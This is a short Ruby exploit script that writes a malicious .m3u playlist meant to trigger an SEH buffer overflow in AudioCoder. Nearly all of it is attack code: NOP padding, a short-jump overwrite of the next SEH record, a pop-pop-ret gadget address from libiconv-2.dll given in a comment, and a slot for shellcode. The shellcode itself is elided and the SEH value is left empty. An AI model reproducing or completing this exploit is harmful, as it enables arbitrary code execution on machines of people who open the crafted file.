#!/usr/bin/env ruby
#offset 41336941
#Seh handler 7A41327A
buffsize = 5000
junk = "http://" + "\x90" * 757
nSEH = "\xeb\x14\x90\x90" # overwrite next seh with jmp instruction (20 bytes)
SEH = ""  # Memory adress 0x6601228e #overwrite seh w/ pop edi pop ebp ret from AudioCoder\libiconv-2.dll
nops = "\x90" * 20
...
sploit = junk + nSEH + SEH + nops + shellcode
fill = "\x43" * (buffsize - sploit.size)
buffer = sploit + fill

File.open("exploit.m3u", 'w') {|s| s.write(buffer)}
puts "The buffer size is: #{buffer.size}"